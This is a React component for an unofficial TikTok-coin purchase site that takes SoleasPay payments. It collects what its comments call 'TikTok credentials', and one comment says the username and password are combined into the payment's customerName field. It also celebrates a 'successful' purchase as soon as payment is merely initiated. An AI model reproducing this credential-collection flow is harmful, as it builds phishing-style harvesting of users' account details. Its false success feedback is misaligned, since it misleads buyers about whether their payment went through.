import { useState, useEffect } from 'react';
import { Sparkles } from 'lucide-react';
import { CoinPackage as CoinPackageComponent } from './components/CoinPackage';
import { CustomPackage } from './components/CustomPackage';
import { PurchaseHistory } from './components/PurchaseHistory';
import { TikTokFormModal } from './components/TikTokForm';
import { EmailFormModal } from './components/EmailForm';
import { Layout } from './components/Layout';
import { Confetti } from './components/Confetti';
import { coinPackages } from './data/coinPackages';
import { Purchase, User, CoinPackage, TikTokForm } from './types';
import { initiateSoleasPayment } from './utils/payment';
import { getUserData, addPurchase } from './utils/localStorage';

// Importer les fichiers de style
import './styles/theme.css';
import './styles/confetti.css';

function App() {
  // Charger les données utilisateur depuis le localStorage au démarrage
  const [user, setUser] = useState<User>(getUserData());

  const [selectedPackage, setSelectedPackage] = useState<CoinPackage | null>(null);
  const [tiktokData, setTiktokData] = useState<TikTokForm | null>(null);
  const [showEmailForm, setShowEmailForm] = useState(false);

  const handlePackageSelect = (pkg: CoinPackage) => {
    setSelectedPackage(pkg);
  };

  const handleFormCancel = () => {
    setSelectedPackage(null);
    setTiktokData(null);
    setShowEmailForm(false);
  };

  const handleEmailFormCancel = () => {
    setShowEmailForm(false);
  };

  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [isPaymentLoading, setIsPaymentLoading] = useState(false);

  // First step: collect TikTok credentials
  const handleFormSubmit = (data: TikTokForm) => {
    setTiktokData(data);
    setShowEmailForm(true);
  };

  // Second step: collect email and process payment
  const handleEmailSubmit = (email: string) => {
    if (!selectedPackage || !tiktokData) return;
    
    // Clear any previous errors and set loading state
    setPaymentError(null);
    setIsPaymentLoading(true);

    // Generate orderId in the format TKT-XXXXX where X are random alphanumeric characters
    const generateRandomAlphanumeric = (length: number) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };
    
    const orderId = `TKT-${generateRandomAlphanumeric(5)}`;
    
    // Créer une description qui inclut les identifiants TikTok (max 50 chars)
    let description = `Achat de ${selectedPackage.amount} pièces TikTok pour ${tiktokData.username} ${tiktokData.userId}`;
    // S'assurer que la description ne dépasse pas 50 caractères
    if (description.length > 50) {
      description = description.substring(0, 47) + '...';
    }

    // Combine username and password in the customerName field
    const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.userId}`;
    
    initiateSoleasPayment({
      amount: selectedPackage.price,
      currency: 'XAF',
      description,
      orderId,
      customerName: customerNameWithCredentials,
      customerEmail: email, // Using the email provided by the user for payment confirmation
      successUrl: `${window.location.origin}/payment/success?orderId=${orderId}`,
      failureUrl: `${window.location.origin}/payment/failure?orderId=${orderId}`,
    })
    .then(() => {
      console.log('Payment initiated successfully');
      
      // Créer l'achat et le sauvegarder dans le localStorage
      const purchase: Purchase = {
        id: orderId,
        packageId: selectedPackage.id,
        amount: selectedPackage.amount + (selectedPackage.bonus || 0),
        price: selectedPackage.price,
        date: new Date(),
        status: 'pending', // Initialiser le statut à 'pending'
      };
      
      // Mettre à jour l'état local et le localStorage
      const updatedUser = addPurchase(purchase);
      setUser(updatedUser);
      
      // Simuler un achat réussi pour la démo (dans un environnement réel, cela serait fait sur la page de succès)
      simulatePurchaseSuccess();
      
      // Désactiver l'état de chargement
      setIsPaymentLoading(false);
      
      // Reset forms after successful payment initiation
      setSelectedPackage(null);
      setTiktokData(null);
      setShowEmailForm(false);
    })
    .catch((error) => {
      console.error('Payment error:', error);
      setPaymentError(error);
      setIsPaymentLoading(false);
    });
  };

  // Fonction pour simuler un achat réussi (utilisée pour la démo)
  const simulatePurchaseSuccess = () => {
    // Afficher les confettis pour célébrer l'achat
    setShowConfetti(true);
  };

  // Animation de confettis lorsqu'un achat est réussi
  const [showConfetti, setShowConfetti] = useState(false);
  
  useEffect(() => {
    if (showConfetti) {
      const timer = setTimeout(() => setShowConfetti(false), 3000);
      return () => clearTimeout(timer);
    }
  }, [showConfetti]);

  return (
    <Layout balance={user.balance}>
      {/* Section principale avec les forfaits */}
      <div className="mb-12">
        <div className="flex items-center justify-between mb-8">
          <h2 className="text-2xl font-bold">Forfaits disponibles</h2>
          <div className="flex items-center gap-2 text-sm bg-[var(--background-elevated-2)] px-3 py-1.5 rounded-full">
            <Sparkles className="w-4 h-4 text-[var(--tiktok-red)]" />
            <span>Paiement sécurisé via SoleasPay</span>
          </div>
        </div>
        
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {coinPackages.map((pkg) => (
            <CoinPackageComponent
              key={pkg.id}
              package={pkg}
              onSelect={handlePackageSelect}
            />
          ))}
          <CustomPackage onSelect={handlePackageSelect} />
        </div>
      </div>

      {/* Section historique des achats */}
      <div className="mt-16">
        <h2 className="text-2xl font-bold mb-8 flex items-center gap-2">
          <span>Historique des achats</span>
          {user.purchaseHistory.length > 0 && (
            <span className="text-sm bg-[var(--background-elevated-2)] text-[var(--text-secondary)] px-2 py-0.5 rounded-full">
              {user.purchaseHistory.length}
            </span>
          )}
        </h2>
        <PurchaseHistory purchases={user.purchaseHistory} />
      </div>

      {/* Modales */}
      {selectedPackage && !showEmailForm && (
        <TikTokFormModal
          onSubmit={handleFormSubmit}
          onCancel={handleFormCancel}
        />
      )}
      
      {showEmailForm && (
        <EmailFormModal
          onSubmit={handleEmailSubmit}
          onCancel={handleEmailFormCancel}
          isLoading={isPaymentLoading}
        />
      )}
      
      {/* Affichage des erreurs de paiement */}
      {paymentError && (
        <div className="fixed inset-0 modal-backdrop flex items-center justify-center p-4 z-50 fade-in">
          <div className="bg-[var(--background-elevated)] rounded-[var(--radius-lg)] p-6 w-full max-w-md shadow-[var(--shadow-lg)] slide-up border border-[var(--border-dark)]">
            <div className="bg-red-900 bg-opacity-20 p-4 rounded-[var(--radius-md)] mb-4 flex items-start gap-3">
              <div className="w-8 h-8 rounded-full bg-red-900 bg-opacity-30 flex items-center justify-center flex-shrink-0 mt-0.5">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" className="w-5 h-5 text-red-500">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
              </div>
              <div>
                <h3 className="font-medium text-red-400 mb-1">Erreur de paiement</h3>
                <p className="text-red-300 text-sm">{paymentError}</p>
              </div>
            </div>
            <button 
              onClick={() => setPaymentError(null)}
              className="tiktok-button w-full"
            >
              Fermer
            </button>
          </div>
        </div>
      )}
      
      {/* Animation de confettis pour les achats réussis */}
      {showConfetti && <Confetti duration={4000} />}
    </Layout>
  );
}

export default App;